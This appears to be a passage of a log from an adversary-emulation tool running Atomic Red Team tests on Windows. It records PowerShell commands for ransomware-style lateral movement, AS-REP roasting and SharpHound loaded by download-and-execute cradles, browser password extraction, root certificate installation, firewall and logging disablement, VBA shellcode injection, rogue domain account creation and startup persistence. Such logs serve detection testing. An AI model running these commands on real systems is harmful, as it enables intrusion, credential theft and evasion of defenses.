            '"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe"}; else; {echo '
            '$machine >> "$offline_list"}}',
 'delegated': '2023-11-29T17:46:12Z',
 'description': "This test simulates MAZE ransomware's propogation script that "
                'searches through a list of computers, tests connectivity to '
                'them, and copies a binary file to the Windows\\Temp directory '
                'of each one. \n'
                'Upon successful execution, a specified binary file will '
                'attempt to be copied to each online machine, a list of the '
                'online machines, as well as a list of offline machines will '
                'be output to a specified location.\n'
                'Reference: '
                'https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n',
 'executor': 'psh',
 'link_id': 'd4f548b2-9035-41ac-a6f5-c1e9e873594d',
 'name': 'MAZE Propagation Script',
 'pid': 9672,
 'plaintext_command': '$machine_list = '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt"; '
                      '$offline_list = '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt"; '
                      '$completed_list = '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt"; '
                      'foreach ($machine in get-content -path '
                      '"$machine_list"); {if (test-connection -Count 1 '
                      '-computername $machine -quiet) ; {cmd /c copy '
                      '"$env:comspec" '
                      '"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe"; echo '
                      '$machine >> "$completed_list"; wmic /node: "$machine" '
                      'process call create "regsvr32.exe /i '
                      'C:\\Windows\\Temp\\T1105.exe"}; else; {echo $machine >> '
                      '"$offline_list"}}',
 'platform': 'windows',
 'run': '2023-11-29T17:46:22Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__51ddafefb92c9dfcb6ce3369e7316bf3__trial_1

atomic_ordering: ['51ddafefb92c9dfcb6ce3369e7316bf3']
------------------------------
{'ability_id': '51ddafefb92c9dfcb6ce3369e7316bf3',
 'agent_reported_time': '2023-11-11T13:10:31Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1553.004',
            'technique_name': 'Subvert Trust Controls: Install Root '
                              'Certificate'},
 'command': '$cert = Import-Certificate -FilePath rootCA.cer '
            '-CertStoreLocation Cert:\\LocalMachine\\My; Move-Item -Path '
            '$cert.PSPath -Destination "Cert:\\LocalMachine\\Root"',
 'delegated': '2023-12-02T19:20:29Z',
 'description': 'Creates a root CA with Powershell\n',
 'executor': 'psh',
 'link_id': '3921878d-e534-4a65-8838-7cc83c5aeb15',
 'name': 'Install root CA on Windows',
 'pid': 10248,
 'plaintext_command': '$cert = Import-Certificate -FilePath rootCA.cer '
                      '-CertStoreLocation Cert:\\LocalMachine\\My; Move-Item '
                      '-Path $cert.PSPath -Destination '
                      '"Cert:\\LocalMachine\\Root"',
 'platform': 'windows',
 'run': '2023-12-02T19:21:18Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__e0c75b4cc32124ef4c61508694fd0808__trial_1

atomic_ordering: ['e0c75b4cc32124ef4c61508694fd0808']
------------------------------
{'ability_id': 'e0c75b4cc32124ef4c61508694fd0808',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.004',
            'technique_name': 'Steal or Forge Kerberos Tickets: AS-REP '
                              'Roasting'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
            '-UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties '
            'distinguishedname -Verbose',
 'delegated': '2023-12-03T08:15:48Z',
 'description': 'Utilizing PowerView, run Get-DomainUser to identify domain '
                'users. Upon execution, progress and info about users within '
                'the domain being scanned will be displayed.\n',
 'executor': 'psh',
 'link_id': '6f83ca28-213b-43de-813a-3e385c751801',
 'name': 'Get-DomainUser with PowerView',
 'pid': 7056,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Get-DomainUser -PreauthNotRequired '
                      '-Properties distinguishedname -Verbose',
 'platform': 'windows',
 'run': '2023-12-03T08:16:09Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__abeb340acb3e1236c6919339942e7c77__trial_1

atomic_ordering: ['abeb340acb3e1236c6919339942e7c77']
------------------------------
{'ability_id': 'abeb340acb3e1236c6919339942e7c77',
 'agent_reported_time': '2023-11-11T13:09:55Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': 'Start-Process "f3d204_WebBrowserPassView.exe"; Start-Sleep '
            '-Second 4; Stop-Process -Name "WebBrowserPassView"',
 'delegated': '2023-12-02T23:31:53Z',
 'description': 'The following Atomic test utilizes WebBrowserPassView to '
                'extract passwords from browsers on a Window system. '
                'WebBrowserPassView is an open source application used to '
                'retrieve passwords stored on a local computer. Recently '
                'noticed as a tool used in the BlackCat Ransomware.',
 'executor': 'psh',
 'link_id': '1659f975-8b1a-4000-bc29-243d830ad366',
 'name': 'WebBrowserPassView - Credentials from Browser',
 'pid': 9236,
 'plaintext_command': 'Start-Process "f3d204_WebBrowserPassView.exe"; '
                      'Start-Sleep -Second 4; Stop-Process -Name '
                      '"WebBrowserPassView"',
 'platform': 'windows',
 'run': '2023-12-02T23:32:16Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1056_002__multiple__input_capture-_gui_input_capture__6f5096d87a8f9ac4c397215cb58cc978__trial_1

atomic_ordering: ['6f5096d87a8f9ac4c397215cb58cc978']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__6d968b2bfa7f45550662620724618fb9__trial_1

atomic_ordering: ['6d968b2bfa7f45550662620724618fb9']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1027__defense-evasion__obfuscated_files_or_information__89a4fca013d3d39fc4effb1f6c8a8d74__trial_1

atomic_ordering: ['89a4fca013d3d39fc4effb1f6c8a8d74']
------------------------------
{'ability_id': '89a4fca013d3d39fc4effb1f6c8a8d74',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1027',
            'technique_name': 'Obfuscated Files or Information'},
 'command': '$OriginalCommand = \'Write-Host "Hey, Atomic!"\'; $Bytes = '
            '[System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); '
            '$EncodedCommand =[Convert]::ToBase64String($Bytes); '
            '$EncodedCommand; Set-ItemProperty -Force -Path '
            'HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug '
            '-Value $EncodedCommand; powershell.exe -Command "IEX '
            '([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp '
            'HKCU:Software\\Microsoft\\Windows\\CurrentVersion '
            'Debug).Debug)))"',
 'delegated': '2023-11-27T12:35:48Z',
 'description': 'Stores base64-encoded PowerShell code in the Windows Registry '
                'and deobfuscates it for execution. This is used by numerous '
                'adversaries and malicious tools.\n'
                '\n'
                'Upon successful execution, powershell will execute encoded '
                'command and read/write from the registry.\n',
 'executor': 'psh',
 'link_id': 'e156f00b-5a8e-4693-b10b-ab2976dd12ac',
 'name': 'Execute base64-encoded PowerShell from Windows Registry',
 'pid': 10992,
 'plaintext_command': '$OriginalCommand = \'Write-Host "Hey, Atomic!"\'; '
                      '$Bytes = '
                      '[System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); '
                      '$EncodedCommand =[Convert]::ToBase64String($Bytes); '
                      '$EncodedCommand; Set-ItemProperty -Force -Path '
                      'HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name '
                      'Debug -Value $EncodedCommand; powershell.exe -Command '
                      '"IEX '
                      '([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp '
                      'HKCU:Software\\Microsoft\\Windows\\CurrentVersion '
                      'Debug).Debug)))"',
 'platform': 'windows',
 'run': '2023-11-27T12:36:34Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__bf9cc3d98c38f79c948a0f4a7f888034__trial_1

atomic_ordering: ['bf9cc3d98c38f79c948a0f4a7f888034']
------------------------------
{'ability_id': 'bf9cc3d98c38f79c948a0f4a7f888034',
 'agent_reported_time': '2023-11-11T13:09:08Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.005',
            'technique_name': 'Signed Binary Proxy Execution: Mshta'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine '
            'JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath '
            '$env:windir\\system32\\mshta.exe',
 'delegated': '2023-11-30T23:44:18Z',
 'description': 'Executes an HTA Application using JScript script engine using '
                'local UNC path simulating lateral movement.',
 'executor': 'psh',
 'link_id': 'f7eae026-0585-46cd-b3f3-9e9d4db76798',
 'name': 'Invoke HTML Application - Jscript Engine over Local UNC Simulating '
         'Lateral Movement',
 'pid': 7216,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHHTMLApplication '
                      '-HTAFilePath Test.hta -ScriptEngine JScript '
                      '-AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath '
                      '$env:windir\\system32\\mshta.exe',
 'platform': 'windows',
 'run': '2023-11-30T23:44:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__986876c6024765475043100f9e080fc8__trial_1

atomic_ordering: ['986876c6024765475043100f9e080fc8']
------------------------------
{'ability_id': '986876c6024765475043100f9e080fc8',
 'agent_reported_time': '2023-11-11T13:09:48Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.004',
            'technique_name': 'Impair Defenses: Disable or Modify System '
                              'Firewall'},
 'command': 'New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile" '
            '-Name EnableFirewall -PropertyType DWORD -Value 0 -Force; '
            'New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile" '
            '-Name EnableFirewall -PropertyType DWORD -Value 0 -Force',
 'delegated': '2023-12-03T16:39:39Z',
 'description': 'An adversary tries to modify the windows firewall registry.\n',
 'executor': 'psh',
 'link_id': '783519c1-3d40-4fba-992d-df9d8639358d',
 'name': 'LockBit Black - Unusual Windows firewall registry modification '
         '-Powershell',
 'pid': 7444,
 'plaintext_command': 'New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile" '
                      '-Name EnableFirewall -PropertyType DWORD -Value 0 '
                      '-Force; New-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile" '
                      '-Name EnableFirewall -PropertyType DWORD -Value 0 '
                      '-Force',
 'platform': 'windows',
 'run': '2023-12-03T16:39:43Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__196263c4c1f42138866d958193ad2ad4__trial_1

atomic_ordering: ['196263c4c1f42138866d958193ad2ad4']
------------------------------
{'ability_id': '196263c4c1f42138866d958193ad2ad4',
 'agent_reported_time': '2023-11-11T13:10:48Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.002',
            'technique_name': 'Account Discovery: Domain Account'},
 'command': "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path "
            '| %{if(([ADSI]"$_").gPlink){Write-Host "[+] OU '
            'Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" '
            '-split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host '
            '"Policy '
            'Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host '
            '"Policy '
            'Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} '
            '};Write-Output "`n" }}',
 'delegated': '2023-11-29T05:53:42Z',
 'description': 'The following Atomic test will utilize ADSISearcher to '
                'enumerate organizational unit within Active Directory.\n'
                'Upon successful execution a listing of users will output with '
                'their paths in AD.\n'
                'Reference: '
                'https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n',
 'executor': 'psh',
 'link_id': '2b0555cc-009f-4112-9802-eea455d27f8c',
 'name': 'Enumerate Linked Policies In ADSISearcher Discovery',
 'pid': 3792,
 'plaintext_command': "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path "
                      '| %{if(([ADSI]"$_").gPlink){Write-Host "[+] OU '
                      'Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) '
                      '-replace "[[;]" -split "]");for($i=0;$i -lt '
                      '$a.length;$i++){if($a[$i]){Write-Host "Policy '
                      'Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host '
                      '"Policy '
                      'Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} '
                      '};Write-Output "`n" }}',
 'platform': 'windows',
 'run': '2023-11-29T05:54:42Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1055__multiple__process_injection__9999b5c073203122cbe5f1f5438cf637__trial_1

atomic_ordering: ['9999b5c073203122cbe5f1f5438cf637']
------------------------------
{'ability_id': '9999b5c073203122cbe5f1f5438cf637',
 'agent_reported_time': '2023-11-11T13:10:42Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1055',
            'technique_name': 'Process Injection'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); Invoke-Maldoc -macroFile '
            '"40c65d_T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"',
 'delegated': '2023-11-28T02:47:11Z',
 'description': 'This module injects shellcode into a newly created process '
                'and executes. By default the shellcode is created,\n'
                'with Metasploit, for use on x86-64 Windows 10 machines.\n'
                '\n'
                'Note: Due to the way the VBA code handles '
                'memory/pointers/injection, a 64bit installation of Microsoft '
                'Office\n'
                'is required.\n',
 'executor': 'psh',
 'link_id': 'a6e765d5-236e-433f-8ba3-3ec85b72356c',
 'name': 'Shellcode execution via VBA',
 'pid': 8972,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); Invoke-Maldoc -macroFile '
                      '"40c65d_T1055-macrocode.txt" -officeProduct "Word" -sub '
                      '"Execute"',
 'platform': 'windows',
 'run': '2023-11-28T02:48:05Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__0ecc3d4729cf37c719528291d63f9f99__trial_1

atomic_ordering: ['0ecc3d4729cf37c719528291d63f9f99']
------------------------------
{'ability_id': '0ecc3d4729cf37c719528291d63f9f99',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': 'write-host "Remote download of SharpHound.ps1 into memory, '
            'followed by execution of the script" -ForegroundColor Cyan; IEX '
            '(New-Object '
            "Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); "
            'Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5',
 'delegated': '2023-11-28T05:03:39Z',
 'description': 'Upon execution SharpHound will load into memory and execute '
                'against a domain. It will set up collection methods, run and '
                'then compress and store the data to the temp directory. If '
                'system is unable to contact a domain, proper execution will '
                'not occur.\n'
                '\n'
                'Successful execution will produce stdout message stating '
                '"SharpHound Enumeration Completed". Upon completion, final '
                'output will be a *BloodHound.zip file.\n',
 'executor': 'psh',
 'link_id': 'dab2d075-384e-4f5d-9de5-e81355729e84',
 'name': 'Run Bloodhound from Memory using Download Cradle',
 'pid': 6896,
 'plaintext_command': 'write-host "Remote download of SharpHound.ps1 into '
                      'memory, followed by execution of the script" '
                      '-ForegroundColor Cyan; IEX (New-Object '
                      "Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); "
                      'Invoke-BloodHound -OutputDirectory $env:Temp; '
                      'Start-Sleep 5',
 'platform': 'windows',
 'run': '2023-11-28T05:03:57Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1136_002__persistence__create_account-_domain_account__8a95e17c084e9a8bf41c69c73beeb0af__trial_1

atomic_ordering: ['8a95e17c084e9a8bf41c69c73beeb0af']
------------------------------
{'ability_id': '8a95e17c084e9a8bf41c69c73beeb0af',
 'agent_reported_time': '2023-11-11T13:10:41Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1136.002',
            'technique_name': 'Create Account: Domain Account'},
 'command': "$SamAccountName = 'T1136.002_Admin'; $AccountPassword = "
            "ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force; "
            'Add-Type -AssemblyName '
            'System.DirectoryServices.AccountManagement; $Context = New-Object '
            '-TypeName '
            'System.DirectoryServices.AccountManagement.PrincipalContext '
            '-ArgumentList '
            '([System.DirectoryServices.AccountManagement.ContextType]::Domain); '
            '$User = New-Object -TypeName '
            'System.DirectoryServices.AccountManagement.UserPrincipal '
            '-ArgumentList ($Context); $User.SamAccountName = $SamAccountName; '
            '$TempCred = New-Object '
            "System.Management.Automation.PSCredential('a', $AccountPassword); "
            '$User.SetPassword($TempCred.GetNetworkCredential().Password); '
            '$User.Enabled = $True; $User.PasswordNotRequired = $False; '
            '$User.DisplayName = $SamAccountName; $User.Save(); $User',
 'delegated': '2023-11-30T11:08:35Z',
 'description': 'Creates a new Domain User using the credentials of the '
                'Current User\n',
 'executor': 'psh',
 'link_id': '99b5d1e2-6a76-473a-a03e-aa006367ea8e',
 'name': 'Create a new Domain Account using PowerShell',
 'pid': 3728,
 'plaintext_command': "$SamAccountName = 'T1136.002_Admin'; $AccountPassword = "
                      "ConvertTo-SecureString 'T1136_pass123!' -AsPlainText "
                      '-Force; Add-Type -AssemblyName '
                      'System.DirectoryServices.AccountManagement; $Context = '
                      'New-Object -TypeName '
                      'System.DirectoryServices.AccountManagement.PrincipalContext '
                      '-ArgumentList '
                      '([System.DirectoryServices.AccountManagement.ContextType]::Domain); '
                      '$User = New-Object -TypeName '
                      'System.DirectoryServices.AccountManagement.UserPrincipal '
                      '-ArgumentList ($Context); $User.SamAccountName = '
                      '$SamAccountName; $TempCred = New-Object '
                      "System.Management.Automation.PSCredential('a', "
                      '$AccountPassword); '
                      '$User.SetPassword($TempCred.GetNetworkCredential().Password); '
                      '$User.Enabled = $True; $User.PasswordNotRequired = '
                      '$False; $User.DisplayName = $SamAccountName; '
                      '$User.Save(); $User',
 'platform': 'windows',
 'run': '2023-11-30T11:09:28Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1110_003__credential-access__brute_force-_password_spraying__7404470d9fed6da5e72123a6b360ce31__trial_1

atomic_ordering: ['7404470d9fed6da5e72123a6b360ce31']
==============================
==============================
adversary_id: atomic__t1105__command-and-control__ingress_tool_transfer__2ed8948f1c1156af47d50379e7965d90__trial_1

atomic_ordering: ['2ed8948f1c1156af47d50379e7965d90']
------------------------------
{'ability_id': '2ed8948f1c1156af47d50379e7965d90',
 'agent_reported_time': '2023-11-11T13:09:48Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1105',
            'technique_name': 'Ingress Tool Transfer'},
 'command': '$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"; New-Item '
            '-Path $datePath -ItemType Directory; Set-Location $datePath; '
            'certutil -verifyctl -split -f '
            'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt; '
            'Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | '
            'Foreach-Object { Move-Item $_.Name -Destination '
            'Atomic-license.txt }',
 'delegated': '2023-11-29T17:26:46Z',
 'description': 'Use certutil -verifyctl argument to download a file from the '
                'web. Note - /verifyctl also works!\n',
 'executor': 'psh',
 'link_id': '96c19c14-78b3-4677-a600-fc106b77cb8f',
 'name': 'certutil download (verifyctl)',
 'pid': 7056,
 'plaintext_command': '$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"; '
                      'New-Item -Path $datePath -ItemType Directory; '
                      'Set-Location $datePath; certutil -verifyctl -split -f '
                      'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt; '
                      'Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} '
                      '| Foreach-Object { Move-Item $_.Name -Destination '
                      'Atomic-license.txt }',
 'platform': 'windows',
 'run': '2023-11-29T17:26:57Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_002__defense-evasion__impair_defenses-_disable_windows_event_logging__7a0717485ca13c441d26bfaaa5c92535__trial_1

atomic_ordering: ['7a0717485ca13c441d26bfaaa5c92535']
------------------------------
{'ability_id': '7a0717485ca13c441d26bfaaa5c92535',
 'agent_reported_time': '2023-11-11T13:09:29Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.002',
            'technique_name': 'Impair Defenses: Disable Windows Event Logging'},
 'command': 'set-WebConfigurationProperty -PSPath "IIS:\\Sites\\Default Web '
            'Site\\" -filter "system.webServer/httpLogging" -name dontLog '
            '-value $true',
 'delegated': '2023-12-03T15:23:20Z',
 'description': 'Disables HTTP logging on a Windows IIS web server as seen by '
                'Threat Group 3390 (Bronze Union).\n'
                'This action requires HTTP logging configurations in IIS to be '
                'unlocked.\n'
                '\n'
                'Use the cleanup commands to restore some default auditpol '
                'settings (your original settings will be lost)\n',
 'executor': 'psh',
 'link_id': '0b050588-e41d-4ced-b6f6-0103286b84ff',
 'name': 'Disable Windows IIS HTTP Logging via PowerShell',
 'pid': 4912,
 'plaintext_command': 'set-WebConfigurationProperty -PSPath '
                      '"IIS:\\Sites\\Default Web Site\\" -filter '
                      '"system.webServer/httpLogging" -name dontLog -value '
                      '$true',
 'platform': 'windows',
 'run': '2023-12-03T15:23:31Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098_001__persistence__account_manipulation-_additional_cloud_credentials__cbcac4dcb804e967b01ea42e59a8c03f__trial_1

atomic_ordering: ['cbcac4dcb804e967b01ea42e59a8c03f']
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__628181210e822588b5d90e1e256d775a__trial_1

atomic_ordering: ['628181210e822588b5d90e1e256d775a']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_009__multiple__boot_or_logon_autostart_execution-_shortcut_modification__501af516bd8b24fee0c7c650ae5cc861__trial_1

atomic_ordering: ['501af516bd8b24fee0c7c650ae5cc861']
------------------------------
{'ability_id': '501af516bd8b24fee0c7c650ae5cc861',
 'agent_reported_time': '2023-11-11T13:10:02Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.009',
            'technique_name': 'Boot or Logon Autostart Execution: Shortcut '
                              'Modification'},
 'command': '$Shell = New-Object -ComObject ("WScript.Shell"); $ShortCut = '
            '$Shell.CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\T1547.009.lnk"); '
            '$ShortCut.TargetPath="cmd.exe"; $ShortCut.WorkingDirectory = '
            '"C:\\Windows\\System32"; $ShortCut.WindowStyle = 1; '
            '$ShortCut.Description = "T1547.009."; $ShortCut.Save(); $Shell = '
            'New-Object -ComObject ("WScript.Shell"); $ShortCut = '
            '$Shell.CreateShortcut("$env:ProgramData\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\T1547.009.lnk"); '
            '$ShortCut.TargetPath="cmd.exe"; $ShortCut.WorkingDirectory = '
            '"C:\\Windows\\System32"; $ShortCut.WindowStyle = 1; '
            '$ShortCut.Description = "T1547.009."; $ShortCut.Save()',
 'delegated': '2023-12-02T07:58:25Z',
 'description': 'LNK file to launch CMD placed in startup folder. Upon '
                'execution, open File Explorer and browse to '
                '"%APPDATA%\\Microsoft\\Windows\\Start '
                'Menu\\Programs\\Startup\\"\n'
                'to view the new shortcut.\n',
 'executor': 'psh',
 'link_id': 'da2537b7-8213-4d13-a316-9bc98191619b',
 'name': 'Create shortcut to cmd in startup folders',
 'pid': 9236,
 'plaintext_command': '$Shell = New-Object -ComObject ("WScript.Shell"); '
                      '$ShortCut = '
                      '$Shell.CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\T1547.009.lnk"); '
                      '$ShortCut.TargetPath="cmd.exe"; '
                      '$ShortCut.WorkingDirectory = "C:\\Windows\\System32"; '
                      '$ShortCut.WindowStyle = 1; $ShortCut.Description = '
                      '"T1547.009."; $ShortCut.Save(); $Shell = New-Object '
                      '-ComObject ("WScript.Shell"); $ShortCut = '
                      '$Shell.CreateShortcut("$env:ProgramData\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\T1547.009.lnk"); '
                      '$ShortCut.TargetPath="cmd.exe"; '
                      '$ShortCut.WorkingDirectory = "C:\\Windows\\System32"; '
                      '$ShortCut.WindowStyle = 1; $ShortCut.Description = '
                      '"T1547.009."; $ShortCut.Save()',
 'platform': 'windows',
 'run': '2023-12-02T07:58:42Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__ab1b50880382b06d48d3d23ad1786239__trial_1

atomic_ordering: ['ab1b50880382b06d48d3d23ad1786239']
------------------------------
{'ability_id': 'ab1b50880382b06d48d3d23ad1786239',
 'agent_reported_time': '2023-11-11T13:10:07Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.002',
            'technique_name': 'User Execution: Malicious File'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); $macrocode = "  a = Shell(`"cmd.exe /c choice '
            '/C Y /N /D Y /T 3`", vbNormalFocus)"; Invoke-MalDoc -macroCode '
            '$macrocode -officeProduct "Word"',
 'delegated': '2023-11-30T15:58:11Z',
 'description': 'This Test uses a VBA macro to execute cmd with flags observed '
                'in recent maldoc and 2nd stage downloaders. Upon execution, '
                'CMD will be launched.\n'
                'Execution is handled by '
                '[Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) '
                'to load and execute VBA code into Excel or Word documents.\n',
 'executor': 'psh',
 'link_id': '62e0fcfb-c98d-460a-8c0c-6810c51e2b28',
 'name': 'Maldoc choice flags command execution',
 'pid': 6480,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); $macrocode = "  a = Shell(`"cmd.exe '
                      '/c choice /C Y /N /D Y /T 3`", vbNormalFocus)"; '
                      'Invoke-MalDoc -macroCode $macrocode -officeProduct '
                      '"Word"',
 'platform': 'windows',
 'run': '2023-11-30T15:58:25Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__ba8ddc38c7c6ced12fecc0d695c5e57c__trial_1

atomic_ordering: ['ba8ddc38c7c6ced12fecc0d695c5e57c']
------------------------------
{'ability_id': 'ba8ddc38c7c6ced12fecc0d695c5e57c',
 'agent_reported_time': '2023-11-11T13:09:41Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1053.005',
            'technique_name': 'Scheduled Task/Job: Scheduled Task'},
 'command': '$Action = New-ScheduledTaskAction -Execute "calc.exe"; $Trigger = '
            'New-ScheduledTaskTrigger -AtLogon; $User = '
